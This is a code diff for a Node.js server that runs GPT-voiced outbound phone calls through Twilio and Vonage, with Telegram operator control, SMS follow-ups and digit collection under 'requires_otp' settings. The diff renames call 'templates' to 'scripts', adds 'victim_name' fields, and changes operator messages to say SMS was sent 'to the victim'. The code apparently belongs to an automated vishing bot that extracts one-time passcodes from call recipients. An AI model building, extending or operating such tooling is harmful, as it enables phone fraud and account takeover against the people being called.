@@ -1099,7 +1099,7 @@ function getDigitSystemHealth() {
   return { status, load: active };
 }
 
-// Built-in telephony function templates to give GPT deterministic controls
+// Built-in telephony function scripts to give GPT deterministic controls
 const telephonyTools = [
   {
     type: 'function',
@@ -1337,6 +1337,7 @@ function normalizeCallStatus(value) {
 
 function formatContactLabel(call) {
   if (call?.customer_name) return call.customer_name;
+  if (call?.victim_name) return call.victim_name;
   const digits = String(call?.phone_number || call?.number || '').replace(/\D/g, '');
   if (digits.length >= 4) {
     return `the contact ending ${digits.slice(-4)}`;
@@ -1361,7 +1362,8 @@ function buildOutcomeSummary(call, status) {
 }
 
 function buildRecapSmsBody(call) {
-  const name = call.customer_name ? ` with ${call.customer_name}` : '';
+  const nameValue = call.customer_name || call.victim_name;
+  const name = nameValue ? ` with ${nameValue}` : '';
   const normalizedStatus = normalizeCallStatus(call.status || call.twilio_status || 'completed');
   const status = normalizedStatus.replace(/_/g, ' ');
   const duration = call.duration ? ` Duration: ${formatDurationForSms(call.duration)}.` : '';
@@ -1373,7 +1375,7 @@ function buildRecapSmsBody(call) {
 }
 
 function buildRetrySmsBody(callRecord, callState) {
-  const name = callState?.customer_name || callRecord?.customer_name;
+  const name = callState?.customer_name || callState?.victim_name || callRecord?.customer_name || callRecord?.victim_name;
   const greeting = name ? `Hi ${name},` : 'Hi,';
   return `${greeting} we tried to reach you by phone. When is a good time to call back?`;
 }
@@ -1716,9 +1718,9 @@ async function ensureAwsSession(callSid) {
   }
 
   gptService.setCallSid(callSid);
-  gptService.setCustomerName(callConfig?.customer_name);
+  gptService.setCustomerName(callConfig?.customer_name || callConfig?.victim_name);
   gptService.setCallProfile(callConfig?.purpose || callConfig?.business_context?.purpose);
-  const intentLine = `Call intent: ${callConfig?.template || 'general'} | purpose: ${callConfig?.purpose || 'general'} | business: ${callConfig?.business_context?.business_id || callConfig?.business_id || 'unspecified'}. Keep replies concise and on-task.`;
+  const intentLine = `Call intent: ${callConfig?.script || 'general'} | purpose: ${callConfig?.purpose || 'general'} | business: ${callConfig?.business_context?.business_id || callConfig?.business_id || 'unspecified'}. Keep replies concise and on-task.`;
   gptService.setCallIntent(intentLine);
   await applyInitialDigitIntent(callSid, callConfig, gptService, 0);
   configureCallTools(gptService, callSid, callConfig, functionSystem);
@@ -1960,9 +1962,9 @@ app.ws('/connection', (ws, req) => {
           }
           
           gptService.setCallSid(callSid);
-          gptService.setCustomerName(callConfig?.customer_name);
+          gptService.setCustomerName(callConfig?.customer_name || callConfig?.victim_name);
           gptService.setCallProfile(callConfig?.purpose || callConfig?.business_context?.purpose);
-          const intentLine = `Call intent: ${callConfig?.template || 'general'} | purpose: ${callConfig?.purpose || 'general'} | business: ${callConfig?.business_context?.business_id || callConfig?.business_id || 'unspecified'}. Keep replies concise and on-task.`;
+          const intentLine = `Call intent: ${callConfig?.script || 'general'} | purpose: ${callConfig?.purpose || 'general'} | business: ${callConfig?.business_context?.business_id || callConfig?.business_id || 'unspecified'}. Keep replies concise and on-task.`;
           gptService.setCallIntent(intentLine);
           if (callConfig) {
             await applyInitialDigitIntent(callSid, callConfig, gptService, interactionCount);
@@ -2304,8 +2306,8 @@ app.ws('/connection', (ws, req) => {
             if (!isDigitIntent && callConfig && digitService) {
               const hasExplicitDigitConfig = !!(
                 callConfig.collection_profile
-                || callConfig.template_policy?.requires_otp
-                || callConfig.template_policy?.default_profile
+                || callConfig.script_policy?.requires_otp
+                || callConfig.script_policy?.default_profile
               );
               if (hasExplicitDigitConfig) {
                 await applyInitialDigitIntent(callSid, callConfig, gptService, interactionCount);
@@ -2560,9 +2562,9 @@ app.ws('/vonage/stream', async (ws, req) => {
     }
 
     gptService.setCallSid(callSid);
-    gptService.setCustomerName(callConfig?.customer_name);
+    gptService.setCustomerName(callConfig?.customer_name || callConfig?.victim_name);
     gptService.setCallProfile(callConfig?.purpose || callConfig?.business_context?.purpose);
-    const intentLine = `Call intent: ${callConfig?.template || 'general'} | purpose: ${callConfig?.purpose || 'general'} | business: ${callConfig?.business_context?.business_id || callConfig?.business_id || 'unspecified'}. Keep replies concise and on-task.`;
+    const intentLine = `Call intent: ${callConfig?.script || 'general'} | purpose: ${callConfig?.purpose || 'general'} | business: ${callConfig?.business_context?.business_id || callConfig?.business_id || 'unspecified'}. Keep replies concise and on-task.`;
     gptService.setCallIntent(intentLine);
     await applyInitialDigitIntent(callSid, callConfig, gptService, 0);
     configureCallTools(gptService, callSid, callConfig, functionSystem);
@@ -3216,7 +3218,7 @@ app.post('/webhook/telegram', async (req, res) => {
           try {
             await smsService.sendSMS(callRecord.phone_number, smsBody);
             webhookService.answerCallbackQuery(cb.id, 'SMS sent').catch(() => {});
-            await webhookService.sendTelegramMessage(chatId, '💬 Follow-up SMS sent to the customer.');
+            await webhookService.sendTelegramMessage(chatId, '💬 Follow-up SMS sent to the victim.');
           } catch (smsError) {
             webhookService.answerCallbackQuery(cb.id, 'Failed to send SMS').catch(() => {});
             await webhookService.sendTelegramMessage(chatId, `❌ Failed to send follow-up SMS: ${smsError.message || smsError}`);
@@ -3278,7 +3280,7 @@ app.post('/webhook/telegram', async (req, res) => {
           try {
             await smsService.sendSMS(callRecord.phone_number, smsBody);
             webhookService.answerCallbackQuery(cb.id, 'Recap sent via SMS').catch(() => {});
-            await webhookService.sendTelegramMessage(chatId, '📩 Recap sent via SMS to the customer.');
+            await webhookService.sendTelegramMessage(chatId, '📩 Recap sent via SMS to the victim.');
           } catch (smsError) {
             webhookService.answerCallbackQuery(cb.id, 'Failed to send SMS').catch(() => {});
             await webhookService.sendTelegramMessage(chatId, `❌ Failed to send recap SMS: ${smsError.message || smsError}`);
@@ -3579,88 +3581,88 @@ app.get('/api/personas', async (req, res) => {
   });
 });
 
-// Call template endpoints for bot template management
-app.get('/api/call-templates', async (req, res) => {
+// Call script endpoints for bot script management
+app.get('/api/call-scripts', async (req, res) => {
   try {
-    const templates = await db.getCallTemplates();
-    res.json({ success: true, templates });
+    const scripts = await db.getCallTemplates();
+    res.json({ success: true, scripts });
   } catch (error) {
-    res.status(500).json({ success: false, error: 'Failed to fetch call templates' });
+    res.status(500).json({ success: false, error: 'Failed to fetch call scripts' });
   }
 });
 
-app.get('/api/call-templates/:id', async (req, res) => {
+app.get('/api/call-scripts/:id', async (req, res) => {
   try {
-    const templateId = Number(req.params.id);
-    if (Number.isNaN(templateId)) {
-      return res.status(400).json({ success: false, error: 'Invalid template id' });
+    const scriptId = Number(req.params.id);
+    if (Number.isNaN(scriptId)) {
+      return res.status(400).json({ success: false, error: 'Invalid script id' });
     }
-    const template = await db.getCallTemplateById(templateId);
-    if (!template) {
-      return res.status(404).json({ success: false, error: 'Template not found' });
+    const script = await db.getCallTemplateById(scriptId);
+    if (!script) {
+      return res.status(404).json({ success: false, error: 'Script not found' });
     }
-    res.json({ success: true, template });
+    res.json({ success: true, script });
   } catch (error) {
-    res.status(500).json({ success: false, error: 'Failed to fetch call template' });
+    res.status(500).json({ success: false, error: 'Failed to fetch call script' });
   }
 });
 
-app.post('/api/call-templates', async (req, res) => {
+app.post('/api/call-scripts', async (req, res) => {
   try {
     const { name, first_message } = req.body || {};
     if (!name || !first_message) {
       return res.status(400).json({ success: false, error: 'name and first_message are required' });
     }
     const id = await db.createCallTemplate(req.body);
-    const template = await db.getCallTemplateById(id);
-    res.status(201).json({ success: true, template });
+    const script = await db.getCallTemplateById(id);
+    res.status(201).json({ success: true, script });
   } catch (error) {
-    res.status(500).json({ success: false, error: 'Failed to create call template' });
+    res.status(500).json({ success: false, error: 'Failed to create call script' });
   }
 });
 
-app.put('/api/call-templates/:id', async (req, res) => {
+app.put('/api/call-scripts/:id', async (req, res) => {
   try {
-    const templateId = Number(req.params.id);
-    if (Number.isNaN(templateId)) {
-      return res.status(400).json({ success: false, error: 'Invalid template id' });
+    const scriptId = Number(req.params.id);
+    if (Number.isNaN(scriptId)) {
+      return res.status(400).json({ success: false, error: 'Invalid script id' });
     }
-    const updated = await db.updateCallTemplate(templateId, req.body || {});
+    const updated = await db.updateCallTemplate(scriptId, req.body || {});
     if (!updated) {
-      return res.status(404).json({ success: false, error: 'Template not found' });
+      return res.status(404).json({ success: false, error: 'Script not found' });
     }
-    const template = await db.getCallTemplateById(templateId);
-    res.json({ success: true, template });
+    const script = await db.getCallTemplateById(scriptId);
+    res.json({ success: true, script });
   } catch (error) {
-    res.status(500).json({ success: false, error: 'Failed to update call template' });
+    res.status(500).json({ success: false, error: 'Failed to update call script' });
   }
 });
 
-app.delete('/api/call-templates/:id', async (req, res) => {
+app.delete('/api/call-scripts/:id', async (req, res) => {
   try {
-    const templateId = Number(req.params.id);
-    if (Number.isNaN(templateId)) {
-      return res.status(400).json({ success: false, error: 'Invalid template id' });
+    const scriptId = Number(req.params.id);
+    if (Number.isNaN(scriptId)) {
+      return res.status(400).json({ success: false, error: 'Invalid script id' });
     }
-    const deleted = await db.deleteCallTemplate(templateId);
+    const deleted = await db.deleteCallTemplate(scriptId);
     if (!deleted) {
-      return res.status(404).json({ success: false, error: 'Template not found' });
+      return res.status(404).json({ success: false, error: 'Script not found' });
     }
     res.json({ success: true });
   } catch (error) {
-    res.status(500).json({ success: false, error: 'Failed to delete call template' });
+    res.status(500).json({ success: false, error: 'Failed to delete call script' });
   }
 });
 
-app.post('/api/call-templates/:id/clone', async (req, res) => {
+app.post('/api/call-scripts/:id/clone', async (req, res) => {
   try {
-    const templateId = Number(req.params.id);
-    if (Number.isNaN(templateId)) {
-      return res.status(400).json({ success: false, error: 'Invalid template id' });
+    const scriptId = Number(req.params.id);
+    if (Number.isNaN(scriptId)) {
+      return res.status(400).json({ success: false, error: 'Invalid script id' });
     }
-    const existing = await db.getCallTemplateById(templateId);
+    const existing = await db.getCallTemplateById(scriptId);
     if (!existing) {
-      return res.status(404).json({ success: false, error: 'Template not found' });
+      return res.status(404).json({ success: false, error: 'Script not found' });
     }
     const payload = {
       ...existing,
@@ -3668,10 +3670,10 @@ app.post('/api/call-templates/:id/clone', async (req, res) => {
     };
     delete payload.id;
     const newId = await db.createCallTemplate(payload);
-    const template = await db.getCallTemplateById(newId);
-    res.status(201).json({ success: true, template });
+    const script = await db.getCallTemplateById(newId);
+    res.status(201).json({ success: true, script });
   } catch (error) {
-    res.status(500).json({ success: false, error: 'Failed to clone call template' });
+    res.status(500).json({ success: false, error: 'Failed to clone call script' });
   }
 });
 
@@ -3687,10 +3689,10 @@ async function buildRetryPayload(callSid) {
     prompt: callRecord.prompt,
     first_message: callRecord.first_message,
     user_chat_id: callRecord.user_chat_id,
-    customer_name: callState?.customer_name || null,
+    customer_name: callState?.customer_name || callState?.victim_name || null,
     business_id: callState?.business_id || null,
-    template: callState?.template || null,
-    template_id: callState?.template_id || null,
+    script: callState?.script || null,
+    script_id: callState?.script_id || null,
     purpose: callState?.purpose || null,
     emotion: callState?.emotion || null,
     urgency: callState?.urgency || null,
@@ -3713,8 +3715,8 @@ async function placeOutboundCall(payload, hostOverride = null) {
     user_chat_id,
     customer_name,
     business_id,
-    template,
-    template_id,
+    script,
+    script_id,
     purpose,
     emotion,
     urgency,
@@ -3819,12 +3821,12 @@ async function placeOutboundCall(payload, hostOverride = null) {
     throw new Error(`Unsupported provider ${currentProvider}`);
   }
 
-  let templatePolicy = {};
-  if (template_id) {
+  let scriptPolicy = {};
+  if (script_id) {
     try {
-      const tpl = await db.getCallTemplateById(Number(template_id));
+      const tpl = await db.getCallTemplateById(Number(script_id));
       if (tpl) {
-        templatePolicy = {
+        scriptPolicy = {
           requires_otp: !!tpl.requires_otp,
           default_profile: tpl.default_profile || null,
           expected_length: tpl.expected_length || null,
@@ -3833,7 +3835,7 @@ async function placeOutboundCall(payload, hostOverride = null) {
         };
       }
     } catch (err) {
-      console.error('Template metadata load error:', err);
+      console.error('Script metadata load error:', err);
     }
   }
 
@@ -3849,8 +3851,8 @@ async function placeOutboundCall(payload, hostOverride = null) {
     function_count: functionSystem.functions.length,
     purpose: purpose || null,
     business_id: business_id || null,
-    template: template || null,
-    template_id: template_id || null,
+    script: script || null,
+    script_id: script_id || null,
     emotion: emotion || null,
     urgency: urgency || null,
     technical_level: technical_level || null,
@@ -3861,7 +3863,7 @@ async function placeOutboundCall(payload, hostOverride = null) {
     collection_max_retries: collection_max_retries || null,
     collection_mask_for_gpt: collection_mask_for_gpt,
     collection_speak_confirmation: collection_speak_confirmation,
-    template_policy: templatePolicy
+    script_policy: scriptPolicy
   };
 
   callConfigurations.set(callId, callConfig);
@@ -3880,8 +3882,8 @@ async function placeOutboundCall(payload, hostOverride = null) {
     await db.updateCallState(callId, 'call_created', {
       customer_name: customer_name || null,
       business_id: business_id || null,
-      template: template || null,
-      template_id: template_id || null,
+      script: script || null,
+      script_id: script_id || null,
       purpose: purpose || null,
       emotion: emotion || null,
       urgency: urgency || null,
@@ -3913,15 +3915,16 @@ async function placeOutboundCall(payload, hostOverride = null) {
 // Enhanced outbound call endpoint with dynamic function generation
 app.post('/outbound-call', async (req, res) => {
   try {
+    const resolvedCustomerName = req.body?.customer_name ?? req.body?.victim_name ?? null;
     const payload = {
       number: req.body?.number,
       prompt: req.body?.prompt,
       first_message: req.body?.first_message,
       user_chat_id: req.body?.user_chat_id,
-      customer_name: req.body?.customer_name,
+      customer_name: resolvedCustomerName,
       business_id: req.body?.business_id,
-      template: req.body?.template,
-      template_id: req.body?.template_id,
+      script: req.body?.script,
+      script_id: req.body?.script_id,
       purpose: req.body?.purpose,
       emotion: req.body?.emotion,
       urgency: req.body?.urgency,
@@ -4266,6 +4269,16 @@ app.get('/api/calls/:callSid', async (req, res) => {
     if (!call) {
       return res.status(404).json({ error: 'Call not found' });
     }
+    let callState = null;
+    try {
+      callState = await db.getLatestCallState(callSid, 'call_created');
+    } catch (_) {
+      callState = null;
+    }
+    const enrichedCall = callState?.customer_name || callState?.victim_name
+      ? { ...call, customer_name: callState?.customer_name || callState?.victim_name }
+      : call;
+    const normalizedCall = normalizeCallRecordForApi(enrichedCall);
 
     const transcripts = await db.getCallTranscripts(callSid);
     
@@ -4293,7 +4306,7 @@ app.get('/api/calls/:callSid', async (req, res) => {
     });
     
     res.json({
-      call,
+      call: normalizedCall,
       transcripts,
       transcript_count: transcripts.length,
       adaptation_analytics: adaptationData,
@@ -4735,7 +4748,7 @@ app.get('/health', async (req, res) => {
       },
       active_calls: callConfigurations.size,
       adaptation_engine: {
-        available_templates: functionEngine ? functionEngine.getBusinessAnalysis().availableTemplates.length : 0,
+        available_scripts: functionEngine ? functionEngine.getBusinessAnalysis().availableTemplates.length : 0,
         active_function_systems: callFunctionSystems.size
       },
       system_health: recentHealthLogs
@@ -4812,8 +4825,10 @@ app.get('/api/calls', async (req, res) => {
     const totalCount = await db.getCallsCount();
 
     // Format the response with enhanced data
-    const formattedCalls = calls.map(call => ({
-      ...call,
+    const formattedCalls = calls.map(call => {
+      const normalized = normalizeCallRecordForApi(call);
+      return {
+      ...normalized,
       transcript_count: call.transcript_count || 0,
       created_date: new Date(call.created_at).toLocaleDateString(),
       duration_formatted: call.duration ? 
@@ -4826,7 +4841,8 @@ app.get('/api/calls', async (req, res) => {
       generated_functions: call.generated_functions ?
         (() => { try { return JSON.parse(call.generated_functions); } catch { return []; } })() :
         []
-    }));
+      };
+    });
 
     res.json({
       success: true,
@@ -5008,6 +5024,12 @@ function getStatusIcon(status) {
     'ringing': '📲'
   };
   return icons[status] || '❓';
+}
+
+function normalizeCallRecordForApi(call) {
+  if (!call || typeof call !== 'object') return call;
+  const normalized = { ...call };
+  return normalized;
 }
 
 // Add calls analytics endpoint
@@ -5383,12 +5405,32 @@ app.post('/email/preview', async (req, res) => {
         if (!emailService) {
             return res.status(500).json({ success: false, error: 'Email service not initialized' });
         }
-        const result = await emailService.previewTemplate(req.body || {});
+        const result = await emailService.previewScript(req.body || {});
         res.json({ success: result.ok, ...result });
     } catch (error) {
         res.status(400).json({ success: false, error: error.message });
     }
 });
+
+function normalizeEmailMessageForApi(message) {
+    if (!message || typeof message !== 'object') return message;
+    const normalized = { ...message };
+    if ('template_id' in normalized) {
+        normalized.script_id = normalized.template_id;
+        delete normalized.template_id;
+    }
+    return normalized;
+}
+
+function normalizeEmailJobForApi(job) {
+    if (!job || typeof job !== 'object') return job;
+    const normalized = { ...job };
+    if ('template_id' in normalized) {
+        normalized.script_id = normalized.template_id;
+        delete normalized.template_id;
+    }
+    return normalized;
+}
 
 app.get('/email/messages/:id', async (req, res) => {
     try {
@@ -5398,7 +5440,7 @@ app.get('/email/messages/:id', async (req, res) => {
             return res.status(404).json({ success: false, error: 'Message not found' });
         }
         const events = await db.listEmailEvents(messageId);
-        res.json({ success: true, message, events });
+        res.json({ success: true, message: normalizeEmailMessageForApi(message), events });
     } catch (error) {
         res.status(500).json({ success: false, error: error.message });
     }
@@ -5411,7 +5453,7 @@ app.get('/email/bulk/:jobId', async (req, res) => {
         if (!job) {
             return res.status(404).json({ success: false, error: 'Bulk job not found' });
         }
-        res.json({ success: true, job });
+        res.json({ success: true, job: normalizeEmailJobForApi(job) });
     } catch (error) {
         res.status(500).json({ success: false, error: error.message });
     }
@@ -5604,43 +5646,43 @@ app.post('/api/sms/schedule', async (req, res) => {
     }
 });
 
-// SMS templates endpoint
-app.get('/api/sms/templates', async (req, res) => {
+// SMS scripts endpoint
+app.get('/api/sms/scripts', async (req, res) => {
     try {
-        const { template_name, variables } = req.query;
+        const { script_name, variables } = req.query;
 
-        if (template_name) {
+        if (script_name) {
             try {
                 const parsedVariables = variables ? JSON.parse(variables) : {};
-                const template = smsService.getTemplate(template_name, parsedVariables);
+                const script = smsService.getScript(script_name, parsedVariables);
 
                 res.json({
                     success: true,
-                    template_name,
-                    template,
+                    script_name,
+                    script,
                     variables: parsedVariables
                 });
-            } catch (templateError) {
+            } catch (scriptError) {
                 res.status(400).json({
                     success: false,
-                    error: templateError.message
+                    error: scriptError.message
                 });
             }
         } else {
-            // Return available templates
+            // Return available scripts
             res.json({
                 success: true,
-                available_templates: [
+                available_scripts: [
                     'welcome', 'appointment_reminder', 'verification', 'order_update',
                     'payment_reminder', 'promotional', 'customer_service', 'survey'
                 ]
             });
         }
     } catch (error) {
-        console.error('❌ SMS templates error:', error);
+        console.error('❌ SMS scripts error:', error);
         res.status(500).json({
             success: false,
-            error: 'Failed to get templates'
+            error: 'Failed to get scripts'
         });
     }
 });
@@ -5851,14 +5893,14 @@ app.get('/api/sms/status/:messageSid', async (req, res) => {
     }
 });
 
-// Enhanced SMS templates endpoint with better error handling
-app.get('/api/sms/templates/:templateName?', async (req, res) => {
+// Enhanced SMS scripts endpoint with better error handling
+app.get('/api/sms/scripts/:scriptName?', async (req, res) => {
     try {
-        const { templateName } = req.params;
+        const { scriptName } = req.params;
         const { variables } = req.query;
 
-        // Built-in templates (fallback)
-        const builtInTemplates = {
+        // Built-in scripts (fallback)
+        const builtInScripts = {
             welcome: 'Welcome to our service! We\'re excited to have you aboard. Reply HELP for assistance or STOP to unsubscribe.',
             appointment_reminder: 'Reminder: You have an appointment on {date} at {time}. Reply CONFIRM to confirm or RESCHEDULE to change.',
             verification: 'Your verification code is: {code}. This code will expire in 10 minutes. Do not share this code with anyone.',
@@ -5869,16 +5911,16 @@ app.get('/api/sms/templates/:templateName?', async (req, res) => {
             survey: 'How was your experience with us? Rate us 1-5 stars by replying with a number. Your feedback helps us improve!'
         };
 
-        if (templateName) {
-            // Get specific template
-            if (!builtInTemplates[templateName]) {
+        if (scriptName) {
+            // Get specific script
+            if (!builtInScripts[scriptName]) {
                 return res.status(404).json({
                     success: false,
-                    error: `Template '${templateName}' not found`
+                    error: `Script '${scriptName}' not found`
                 });
             }
 
-            let template = builtInTemplates[templateName];
+            let script = builtInScripts[scriptName];
             let parsedVariables = {};
 
             // Parse and apply variables if provided
@@ -5886,38 +5928,38 @@ app.get('/api/sms/templates/:templateName?', async (req, res) => {
                 try {
                     parsedVariables = JSON.parse(variables);
                     
-                    // Replace variables in template
+                    // Replace variables in script
                     for (const [key, value] of Object.entries(parsedVariables)) {
-                        template = template.replace(new RegExp(`{${key}}`, 'g'), value);
+                        script = script.replace(new RegExp(`{${key}}`, 'g'), value);
                     }
                 } catch (parseError) {
-                    console.error('Error parsing template variables:', parseError);
-                    // Continue with template without variable substitution
+                    console.error('Error parsing script variables:', parseError);
+                    // Continue with script without variable substitution
                 }
             }
 
             res.json({
                 success: true,
-                template_name: templateName,
-                template: template,
-                original_template: builtInTemplates[templateName],
+                script_name: scriptName,
+                script: script,
+                original_script: builtInScripts[scriptName],
                 variables: parsedVariables
             });
 
         } else {
-            // Get list of available templates
+            // Get list of available scripts
             res.json({
                 success: true,
-                available_templates: Object.keys(builtInTemplates),
-                template_count: Object.keys(builtInTemplates).length
+                available_scripts: Object.keys(builtInScripts),
+                script_count: Object.keys(builtInScripts).length
             });
         }
 
     } catch (error) {
-        console.error('❌ Error handling SMS templates:', error);
+        console.error('❌ Error handling SMS scripts:', error);
         res.status(500).json({
             success: false,
-            error: 'Failed to process template request',
+            error: 'Failed to process script request',
             details: error.message
         });
     }
